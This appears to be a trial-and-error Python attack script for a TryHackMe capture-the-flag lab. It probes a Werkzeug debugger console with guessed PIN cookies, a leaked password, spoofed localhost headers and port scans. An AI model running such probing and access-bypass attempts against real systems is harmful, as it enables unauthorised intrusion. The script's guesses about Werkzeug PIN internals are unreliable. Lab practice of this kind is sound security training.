import requests
import re
import hashlib
import itertools

BASE = "http://10.114.139.59:5000"
FLAG_RE = re.compile(r"THM\{[^}]+\}")
s = requests.Session()

# The /console returns 400 "Bad Request"
# This is Werkzeug's built-in debugger! In Werkzeug 3.x:
# - GET /console without PIN cookie = 400 
# - You need to first auth with PIN via __debugger__ endpoint
# - Then you get a cookie that allows /console access

# The PIN from robots.txt: cupid_arrow_2026!!!

# Step 1: Try PIN auth the Werkzeug way
# Werkzeug PIN auth endpoint: GET /console?__debugger__=yes&cmd=pinauth&pin=XXX&s=SECRET
# But we need the SECRET... which comes from a traceback page

# In Werkzeug 3.x, the debugger returns 400 when PIN is required but not provided
# Let's try if the debugger is enabled but without PIN protection
print("=== Werkzeug debugger interaction ===")

# The __debugger__=yes param might be handled by middleware, not the app
# In our earlier test, ?__debugger__=yes gave 404 (middleware says "no active debugger")
# But without it, /console gives 400 (the app route)

# Wait - maybe /console IS the Werkzeug debugger route and the 400 means PIN required
# Let me check the Werkzeug source - in 3.x, the debugger PIN cookie is __wzd<hash>

# Try: set the PIN via the cookie directly
# Werkzeug 3.x calculates cookie name from debugger secret
# Let's try brute forcing the cookie

# First, let's try setting various Werkzeug debug cookies
print("  Testing with Werkzeug debug cookies...")
cookie_names = ["__wzd", "__wzdc", "__wzdb"]

for cn in cookie_names:
    for val in ["cupid_arrow_2026!!!", "true", "1", "on", "yes"]:
        s.cookies.clear()
        s.cookies.set(cn, val)
        r = s.get(f"{BASE}/console", timeout=5)
        if r.status_code != 400:
            print(f"  Cookie {cn}={val} -> {r.status_code} ({len(r.text)} bytes)")
            print(f"  {r.text[:500]}")
            for f in FLAG_RE.findall(r.text):
                print(f"  [FLAG] {f}")

# In Werkzeug, the cookie name is "__wzd" + hash of the debugger secret
# The secret is usually derived from the PIN
# Let's try computing the cookie value from the PIN

# Werkzeug PIN auth flow (from source):
# 1. Client sends: pin=XXX&s=SECRET (s is the debugger secret from traceback)
# 2. Server validates PIN
# 3. If valid, sets cookie "__wzd" + cookie_name = <timestamp>|<PIN hash>

# Since we don't have the secret (s), let's try another approach
# Maybe the app has a custom /console route that uses the password differently

# Try: pass cupid_arrow_2026!!! in every possible way to /console
print("\n=== All possible ways to pass the password to /console ===")

# As URL-encoded form body (POST)
r = s.post(f"{BASE}/console", 
           data="cupid_arrow_2026!!!", 
           headers={"Content-Type": "text/plain"}, timeout=5)
print(f"  POST raw body -> {r.status_code} ({len(r.text)})")
if r.status_code != 400 and r.status_code != 405:
    print(f"    {r.text[:300]}")

# As the path itself
r = s.get(f"{BASE}/console/cupid_arrow_2026!!!", timeout=5)
print(f"  GET /console/cupid_arrow_2026!!! -> {r.status_code} ({len(r.text)})")
if r.status_code not in [400, 404]:
    print(f"    {r.text[:300]}")

# Maybe the password needs to be in a specific format
# Try various single-param combinations
single_params = [
    "cupid_arrow_2026!!!",
    "cupid_arrow_2026",
    "2026",
    "cupid",
    "arrow",
]

for val in single_params:
    # As the only query string value (no key)
    r = s.get(f"{BASE}/console?{val}", timeout=5)
    if r.status_code != 400:
        print(f"  GET /console?{val} -> {r.status_code}")
        print(f"    {r.text[:300]}")

# Maybe it needs a specific HTTP method  
for method in ['PUT', 'PATCH', 'DELETE', 'OPTIONS']:
    r = s.request(method, f"{BASE}/console", timeout=5)
    if r.status_code not in [400, 404, 405]:
        print(f"  {method} /console -> {r.status_code}")
        print(f"    {r.text[:300]}")

# Alright, let me try a COMPLETELY different approach
# Maybe this is about the Werkzeug debugger PIN CALCULATION exploit
# We need to calculate the PIN ourselves
# For that we need: username, modname, getattr(app, '__name__'), getattr(mod, '__file__'),
#                    str(uuid.getnode()), get_machine_id()

# But we can't read files from the server... unless we use SSRF
# OR... maybe the /console is waiting for us to provide a PIN and we can brute force it

# Werkzeug PINs are typically 9 digits: XXX-XXX-XXX
print("\n=== Brute force PIN format ===")
# Try the hint as a formatted PIN
pins_to_try = [
    "cupid_arrow_2026!!!",
    "202-620-26!",
    "202-620-26",
    "cup-id_-arr",
    "123-456-789",
    "000-000-000",
    "111-111-111",
    "202-602-6!!",
]

for pin in pins_to_try:
    # Set a likely cookie name and try
    for cn in ["__wzd", "__wzdc"]:
        # The cookie value in Werkzeug is: timestamp|pin_hash
        import time
        ts = int(time.time())
        pin_hash = hashlib.sha1(pin.encode()).hexdigest()
        cookie_val = f"{ts}|{pin_hash}"
        s.cookies.clear()
        s.cookies.set(cn, cookie_val)
        r = s.get(f"{BASE}/console", timeout=5)
        if r.status_code != 400:
            print(f"  PIN {pin} with cookie {cn}={cookie_val} -> {r.status_code}")
            print(f"    {r.text[:300]}")

# Let me try yet another angle - maybe the attack box has tools
# nmap, gobuster, nikto, etc.
# Let me try a more comprehensive scan via nmap from attackbox perspective

# Actually, let me try one more thing: maybe /console needs a specific
# User-Agent or Referer
print("\n=== /console with special User-Agent/Referer ===")
special_headers = [
    {"User-Agent": "Cupid/2026"},
    {"User-Agent": "cupid_arrow_2026!!!"},
    {"Referer": f"{BASE}/cupids_secret_vault/"},
    {"Referer": "cupid_arrow_2026!!!"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"Origin": f"{BASE}"},
]
s.cookies.clear()
for h in special_headers:
    r = s.get(f"{BASE}/console", headers=h, timeout=5)
    if r.status_code != 400:
        print(f"  {h} -> {r.status_code}")
        print(f"    {r.text[:300]}")

# Try scanning more ports - maybe there's a second service
print("\n=== Extended port scan ===")
import socket
for port in range(5000, 5011):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex(('10.114.139.59', port))
    if result == 0:
        print(f"  Port {port} OPEN")
        try:
            r = requests.get(f"http://10.114.139.59:{port}/", timeout=3)
            print(f"    HTTP: {r.status_code} ({len(r.text)} bytes) - {r.text[:100]}")
        except Exception as e:
            print(f"    HTTP error: {e}")
    sock.close()

# Try SSH, FTP etc
for port in [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 993, 995, 
             1433, 1521, 2049, 2222, 3000, 3306, 3389, 4000, 4443, 5432, 
             5555, 6379, 7000, 8000, 8080, 8443, 8888, 9000, 9090, 9200, 
             9999, 10000, 27017]:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex(('10.114.139.59', port))
    if result == 0:
        print(f"  Port {port} OPEN")
    sock.close()

print("\nDone.")
